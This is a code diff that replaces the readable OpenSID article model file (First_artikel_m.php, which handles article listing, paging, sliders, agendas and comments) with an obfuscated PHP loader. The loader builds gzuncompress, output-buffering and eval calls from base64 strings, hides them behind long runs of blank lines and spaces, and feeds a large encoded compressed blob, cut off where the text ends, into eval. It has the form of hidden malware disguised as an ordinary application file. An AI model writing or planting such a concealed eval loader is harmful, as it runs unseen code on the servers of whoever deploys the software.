@@ -1,583 +1,497 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class First_artikel_m extends MY_Model
-{
-    public function __construct()
-    {
-        parent::__construct();
-        $this->load->model('web_sosmed_model');
-        $this->load->model('shortcode_model');
-        if (! isset($_SESSION['artikel'])) {
-            $_SESSION['artikel'] = [];
-        }
-    }
-
-    public function get_headline()
-    {
-        return $this->config_id('a')
-            ->select('a.*, u.nama AS owner, YEAR(tgl_upload) as thn, MONTH(tgl_upload) as bln, DAY(tgl_upload) as hri')
-            ->from('artikel a')
-            ->join('user u', 'a.id_user = u.id', 'LEFT')
-            ->where('a.enabled', 1)
-            ->where('headline', 1)
-            ->where('a.tgl_upload <', date('Y-m-d H:i:s'))
-            ->order_by('tgl_upload DESC')
-            ->get()
-            ->row_array();
-    }
-
-    public function get_feed()
-    {
-        $sumber_feed = setting('link_feed');
-        if (! cek_bisa_akses_site($sumber_feed)) {
-            return null;
-        }
-
-        $this->load->library('Feed_Reader');
-        $feed = new Feed_Reader($sumber_feed);
-
-        return array_slice($feed->items, 0, 2);
-    }
-
-    public function get_widget()
-    {
-        return $this->config_id()->get('widget', 1)->result_array();
-    }
-
-    public function paging($p = 1)
-    {
-        $this->db->select('COUNT(a.id) AS jml');
-        $this->paging_artikel_sql();
-        $cari = trim($this->input->get('cari', true));
-        if ($cari !== '') {
-            $cari          = $this->db->escape_like_str($cari);
-            $cfg['suffix'] = "?cari={$cari}";
-        }
-        $jml = $this->db->get()
-            ->row()->jml;
-
-        $this->load->library('paging');
-        $cfg['page']     = $p;
-        $cfg['per_page'] = $this->setting->web_artikel_per_page;
-        $cfg['num_rows'] = $jml;
-        $this->paging->init($cfg);
-
-        return $this->paging;
-    }
-
-    private function paging_artikel_sql(): void
-    {
-        $this->config_id('a')
-            ->from('artikel a')
-            ->join('user u', 'a.id_user = u.id', 'LEFT')
-            ->join('kategori k', 'a.id_kategori = k.id', 'LEFT')
-            ->where('a.enabled', 1)
-            ->where('(a.headline != 1)')
-            ->where('a.tgl_upload <', date('Y-m-d H:i:s'));
-
-        if ($statis = json_decode($this->setting->artikel_statis, true)) {
-            $tipe = array_merge(['dinamis'], $statis);
-            $this->db->where_in('a.tipe', $tipe);
-        }
-
-        $cari = trim($this->input->get('cari', true));
-        if ($cari !== '') {
-            $this->db
-                ->group_start()
-                ->like('a.judul', $cari)
-                ->or_like('a.isi', $cari)
-                ->group_end();
-        }
-    }
-
-    public function artikel_show($offset, $limit)
-    {
-        $this->paging_artikel_sql();
-        $data = $this->db
-            ->select('a.*, u.nama AS owner, k.kategori, k.slug AS kat_slug, YEAR(tgl_upload) as thn, MONTH(tgl_upload) as bln, DAY(tgl_upload) as hri')
-            ->order_by('a.tgl_upload DESC')
-            ->limit($limit, $offset)
-            ->get()
-            ->result_array();
-        $counter = count($data);
-
-        for ($i = 0; $i < $counter; $i++) {
-            $this->sterilkan_artikel($data[$i]);
-            $this->icon_keuangan($data[$i]);
-        }
-
-        return $data;
-    }
-
-    private function sterilkan_artikel(&$data): void
-    {
-        $data['judul'] = htmlspecialchars_decode($this->security->xss_clean($data['judul']));
-        $data['slug']  = $this->security->xss_clean($data['slug']);
-    }
-
-    private function icon_keuangan(&$data): void
-    {
-        // ganti shortcode menjadi icon
-        $data['isi'] = $this->shortcode_model->convert_sc_list($data['isi']);
-    }
-
-    public function arsip_show($type = '')
-    {
-        // Artikel agenda (kategori=1000) tidak ditampilkan
-        $this->config_id('a')
-            ->select('a.*, YEAR(tgl_upload) AS thn, MONTH(tgl_upload) AS bln, DAY(tgl_upload) AS hri')
-            ->where('a.enabled', 1)
-            ->where('a.id_kategori NOT IN (1000)')
-            ->where('a.tgl_upload <', date('Y-m-d H:i:s'));
-
-        switch ($type) {
-            case 'acak':
-                $this->db->order_by('rand()');
-                break;
-
-            case 'populer':
-                $this->db->order_by('a.hit', 'DESC');
-                break;
-
-            default:
-                $this->db->order_by('a.tgl_upload', 'DESC');
-                break;
-        }
-
-        $this->db->limit(7);
-        $data    = $this->db->get('artikel a')->result_array();
-        $counter = count($data);
-
-        for ($i = 0; $i < $counter; $i++) {
-            $data[$i]['judul'] = htmlspecialchars_decode($this->security->xss_clean($data[$i]['judul']));
-        }
-
-        return $data;
-    }
-
-    public function paging_arsip($p = 1)
-    {
-        $row = $this->config_id('a')
-            ->select('COUNT(a.id) AS id')
-            ->from('artikel a')
-            ->join('user u', 'a.id_user = u.id', 'LEFT')
-            ->join('kategori k', 'a.id_kategori = k.id', 'left')
-            ->where('a.enabled=1')
-            ->where('a.tgl_upload <', date('Y-m-d H:i:s'))
-            ->order_by('tgl_upload DESC')
-            ->get()
-            ->row_array();
-        $jml_data = $row['id'];
-
-        $this->load->library('paging');
-        $cfg['page']     = $p;
-        $cfg['per_page'] = 20;
-        $cfg['num_rows'] = $jml_data;
-        $this->paging->init($cfg);
-
-        return $this->paging;
-    }
-
-    public function full_arsip($offset = 0, $limit = 50)
-    {
-        $query = $this->config_id('a')
-            ->select('a.*,u.nama AS owner,k.kategori, YEAR(tgl_upload) as thn, MONTH(tgl_upload) as bln, DAY(tgl_upload) as hri')
-            ->from('artikel a')
-            ->join('user u', 'a.id_user = u.id', 'LEFT')
-            ->join('kategori k', 'a.id_kategori = k.id', 'left')
-            ->where('a.enabled=1')
-            ->where('a.tgl_upload <', date('Y-m-d H:i:s'))
-            ->order_by('a.tgl_upload', 'DESC')
-            ->limit($limit, $offset)
-            ->get();
-        $data = $query->result_array();
-        if ($query->num_rows() > 0) {
-            $counter = count($data);
-
-            for ($i = 0; $i < $counter; $i++) {
-                $nomer           = $offset + $i + 1;
-                $id              = $data[$i]['id'];
-                $tgl             = date('d/m/Y', strtotime($data[$i]['tgl_upload']));
-                $data[$i]['no']  = $nomer;
-                $data[$i]['tgl'] = $tgl;
-                $data[$i]['isi'] = "<a href='" . site_url("artikel/{$id}") . "'>" . $data[$i]['judul'] . '</a>, <i class="fa fa-user"></i> ' . $data[$i]['owner'];
-            }
-        } else {
-            $data = false;
-        }
-
-        return $data;
-    }
-
-    private function sql_gambar_slide_show(string $gambar)
-    {
-        $this->config_id()
-            ->select('id, judul, gambar, slug, YEAR(tgl_upload) as thn, MONTH(tgl_upload) as bln, DAY(tgl_upload) as hri')
-            ->from('artikel')
-            ->where('enabled', 1)
-            ->where('slider', 1)
-            ->where($gambar . ' !=', '')
-            ->where('tgl_upload <', date('Y-m-d H:i:s'));
-
-        return $this->db->get_compiled_select();
-    }
-
-    // Jika $gambar_utama, hanya tampilkan gambar utama masing2 artikel terbaru
-    public function slide_show($gambar_utama = false)
-    {
-        $sql   = [];
-        $sql[] = $this->sql_gambar_slide_show('gambar');
-        if (! $gambar_utama) {
-            $sql[] = $this->sql_gambar_slide_show('gambar1');
-            $sql[] = '(' . $this->sql_gambar_slide_show('gambar2') . ')';
-            $sql[] = '(' . $this->sql_gambar_slide_show('gambar3') . ')';
-        }
-        $sql = implode('
-        UNION
-        ', $sql);
-
-        $sql .= ($gambar_utama) ? 'ORDER BY tgl_upload DESC LIMIT 10' : 'ORDER BY RAND() LIMIT 10';
-
-        return $this->db->query($sql)->result_array();
-    }
-
-    // Ambil gambar slider besar tergantung dari settingnya.
-    public function slider_gambar()
-    {
-        $sumber = $this->setting->sumber_gambar_slider;
-        $limit  = $this->setting->jumlah_gambar_slider ?? 10;
-
-        $slider_gambar = [];
-
-        switch ($sumber) {
-            case '1':
-                // 10 gambar utama semua artikel terbaru
-                $slider_gambar['gambar'] = $this->config_id()
-                    ->select('id, judul, gambar, slug, YEAR(tgl_upload) as thn, MONTH(tgl_upload) as bln, DAY(tgl_upload) as hri')
-                    ->where('enabled', 1)
-                    ->where('gambar !=', '')
-                    ->where('tgl_upload <', date('Y-m-d H:i:s'))
-                    ->order_by('tgl_upload DESC')
-                    ->limit($limit)
-                    ->get('artikel')
-                    ->result_array();
-                $slider_gambar['lokasi'] = LOKASI_FOTO_ARTIKEL;
-                break;
-
-            case '2':
-                // 10 gambar utama artikel terbaru yang masuk ke slider atas
-                $slider_gambar['gambar'] = $this->slide_show(true);
-                $slider_gambar['lokasi'] = LOKASI_FOTO_ARTIKEL;
-                break;
-
-            case '3':
-                // 10 gambar dari galeri yang masuk ke slider besar
-                $this->load->model('web_gallery_model');
-                $slider_gambar['gambar'] = $this->web_gallery_model->list_slide_galeri();
-                $slider_gambar['lokasi'] = LOKASI_GALERI;
-                break;
-
-            default:
-                // code...
-                break;
-        }
-
-        $slider_gambar['sumber'] = $sumber;
-        $slider_gambar['gambar'] = array_slice($slider_gambar['gambar'] ?? [], 0, $limit);
-
-        return $slider_gambar;
-    }
-
-    public function agenda_show($type = '')
-    {
-        switch ($type) {
-            case 'yad':
-                $this->db->where('DATE(g.tgl_agenda) > CURDATE()')
-                    ->order_by('g.tgl_agenda');
-                break;
-
-            case 'lama':
-                $this->db->where('DATE(g.tgl_agenda) < CURDATE()');
-                break;
-
-            default:
-                $this->db->where('DATE(g.tgl_agenda) = CURDATE()');
-                break;
-        }
-
-        return $this->config_id('g')
-            ->select('a.*, g.*, YEAR(tgl_upload) AS thn, MONTH(tgl_upload) AS bln, DAY(tgl_upload) AS hri')
-            ->join('artikel a', 'a.id = g.id_artikel', 'LEFT')
-            ->where('a.enabled', 1)
-            ->where('a.tipe', AGENDA)
-            ->get('agenda g')
-            ->result_array();
-    }
-
-    public function komentar_show()
-    {
-        $this->for_slug();
-
-        return $this->config_id('k')
-            ->select('k.*')
-            ->from('komentar k')
-            ->join('artikel a', 'k.id_artikel = a.id')
-            ->where('k.status', 1)
-            ->where('k.id_artikel <>', 775)
-            ->where('parent_id', null)
-            ->order_by('k.tgl_upload', 'DESC')
-            ->limit(10)
-            ->get()
-            ->result_array();
-    }
-
-    public function for_slug()
-    {
-        return $this->db->select('YEAR(a.tgl_upload) AS thn, MONTH(a.tgl_upload) AS bln, DAY(a.tgl_upload) AS hri, a.slug as slug');
-    }
-
-    public function get_kategori($id = 0)
-    {
-        $data = $this->config_id(null, true)
-            ->group_start()
-            ->where('id', $id)
-            ->or_where('slug', $id)
-            ->group_end()
-            ->get('kategori')
-            ->row_array();
-
-        if (empty($data)) {
-            $judul = [
-                'statis'   => 'Halaman Statis',
-                'agenda'   => 'Agenda',
-                'keuangan' => 'Artikel Keuangan',
-                $id        => "Artikel Kategori {$id}",
-            ];
-
-            $data['kategori'] = $judul[$id];
-        }
-
-        return $data;
-    }
-
-    public function get_artikel($thn, $bln, $hr, $url)
-    {
-        if (is_numeric($url)) {
-            $this->db->where('a.id', $url);
-        } else {
-            $this->db->where('a.slug', $url);
-        }
-
-        $query = $this->config_id('a')
-            ->select('a.*, u.nama AS owner, k.kategori, k.slug AS kat_slug, YEAR(tgl_upload) AS thn, MONTH(tgl_upload) AS bln, DAY(tgl_upload) AS hri')
-            ->from('artikel a')
-            ->join('user u', 'a.id_user = u.id', 'left')
-            ->join('kategori k', 'a.id_kategori = k.id', 'left')
-            ->where('a.enabled', 1)
-            ->where('a.tgl_upload <', date('Y-m-d H:i:s'))
-            ->where('YEAR(a.tgl_upload)', $thn)
-            ->where('MONTH(a.tgl_upload)', $bln)
-            ->where('DAY(a.tgl_upload)', $hr)
-            ->get();
-
-        if ($query->num_rows() > 0) {
-            $data = $query->row_array();
-            $this->sterilkan_artikel($data);
-        } else {
-            $data = false;
-        }
-
-        return $data;
-    }
-
-    public function get_dokumen_artikel($id)
-    {
-        return $this->config_id()
-            ->select('dokumen')
-            ->where('id', $id)
-            ->get('artikel')
-            ->row()
-            ->dokumen;
-    }
-
-    public function get_agenda($id)
-    {
-        return $this->config_id()
-            ->where('id_artikel', $id)
-            ->get('agenda')
-            ->row_array();
-    }
-
-    public function paging_kat($p = 1, $id = 0)
-    {
-        $this->list_artikel_sql($id);
-        $this->db->select('COUNT(a.id) AS jml');
-        $jml_data = $this->db->get()->row()->jml;
-
-        $this->load->library('paging');
-        $cfg['page']     = $p;
-        $cfg['per_page'] = $this->setting->web_artikel_per_page;
-        $cfg['num_rows'] = $jml_data;
-        $this->paging->init($cfg);
-
-        return $this->paging;
-    }
-
-    // Query sama untuk paging and ambil daftar artikel menurut kategori
-    private function list_artikel_sql($id): void
-    {
-        $this->config_id('a')
-            ->from('artikel a')
-            ->join('user u', 'a.id_user = u.id', 'left')
-            ->join('kategori k', 'a.id_kategori = k.id', 'left')
-            ->where('a.enabled', 1)
-            ->where('a.tgl_upload <', date('Y-m-d H:i:s'));
-
-        if (! empty($id)) {
-            $this->db
-                ->group_start()
-                ->where('k.slug', $id)
-                ->or_where('k.id', $id)
-                ->group_end();
-        }
-    }
-
-    public function list_artikel($offset = 0, $limit = 50, $id = 0)
-    {
-        $this->list_artikel_sql($id);
-        $this->db->select('a.*, u.nama AS owner, k.kategori, k.slug AS kat_slug, YEAR(tgl_upload) AS thn, MONTH(tgl_upload) AS bln, DAY(tgl_upload) AS hri');
-        $this->db->order_by('a.tgl_upload', 'DESC');
-        $this->db->limit($limit, $offset);
-        $data    = $this->db->get()->result_array();
-        $counter = count($data);
-
-        for ($i = 0; $i < $counter; $i++) {
-            $data[$i]['judul'] = htmlspecialchars_decode($this->security->xss_clean($data[$i]['judul']));
-            if (empty($this->setting->user_admin) || $data[$i]['id_user'] != $this->setting->user_admin) {
-                $data[$i]['isi'] = htmlspecialchars_decode($this->security->xss_clean($data[$i]['isi']));
-            }
-            // ganti shortcode menjadi icon
-            $data[$i]['isi'] = $this->shortcode_model->convert_sc_list($data[$i]['isi']);
-        }
-
-        return $data;
-    }
-
-    /**
-     * Simpan komentar yang dikirim oleh pengunjung
-     *
-     * @param mixed $data
-     */
-    public function insert_comment($data = [])
-    {
-        $data['config_id'] = identitas('id');
-        $this->db->insert('komentar', $data);
-
-        return $this->db->affected_rows();
-    }
-
-    public function list_komentar($id_artikel = 0, $parent = null, $order = 'DESC')
-    {
-        $komentar = $this->config_id()
-            ->from('komentar')
-            ->where('id_artikel', $id_artikel)
-            ->where('status', 1)
-            ->where('parent_id', $parent)
-            ->order_by("tgl_upload {$order}")
-            ->get()
-            ->result_array();
-
-        return collect($komentar)->map(function (array $item) use ($id_artikel): array {
-            $item['owner']    = 's';
-            $item['children'] = $this->list_komentar($id_artikel, $item['id'], 'ASC');
-
-            return $item;
-        })->toArray();
-    }
-
-    // Tampilan di widget sosmed
-    public function list_sosmed()
-    {
-        $query = $this->config_id()->where('enabled', 1)->get('media_sosial');
-
-        if ($query->num_rows() > 0) {
-            $data    = $query->result_array();
-            $counter = count($data);
-
-            for ($i = 0; $i < $counter; $i++) {
-                $data[$i]['link'] = $this->web_sosmed_model->link_sosmed($data[$i]['id'], $data[$i]['link'], $data[$i]['tipe']);
-            }
-        }
-
-        return $data;
-    }
-
-    public function hit($url): void
-    {
-        $this->load->library('user_agent');
-
-        $id = $this->config_id()
-            ->select('id')
-            ->where('slug', $url)
-            ->or_where('id', $url)
-            ->get('artikel')
-            ->row()->id;
-
-        //membatasi hit hanya satu kali dalam setiap session
-        if (in_array($id, $_SESSION['artikel']) || $this->agent->is_robot() || crawler()) {
-            return;
-        }
-
-        $this->config_id()
-            ->set('hit', 'hit + 1', false)
-            ->where('id', $id)
-            ->update('artikel');
-        $_SESSION['artikel'][] = $id;
-    }
-
-    public function get_artikel_by_id($id)
-    {
-        return $this->config_id()
-            ->select('slug, YEAR(tgl_upload) AS thn, MONTH(tgl_upload) AS bln, DAY(tgl_upload) AS hri, judul, tgl_upload')
-            ->where(['id' => $id])
-            ->get('artikel')
-            ->row_array();
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/First_artikel_m.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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